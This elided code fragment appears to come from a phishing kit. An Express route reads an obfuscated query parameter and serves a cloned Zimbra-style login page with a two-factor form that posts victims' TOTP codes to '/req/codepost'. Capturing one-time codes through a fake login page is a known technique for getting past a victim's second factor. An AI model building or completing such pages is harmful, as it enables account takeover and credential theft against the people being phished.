...
router.get('/', (req, res) => {
    ...
    const b64 = req.query.dfgfhtuyghnbcgferfh;
				...
				<form id="zLoginForm" method="post" name="loginForm" action="/req/codepost" accept-charset="UTF-8">
                        ...
                        <div class="twoFactorForm">
                                <div>
                                   ...
                                   <input tabindex="0" class="zLoginFieldInput" id="totpcode" name="totpcode" type="text" value="" size="40" maxlength="1024" autocomplete="off" onkeyup="disableEnable(this)">
                                </div>
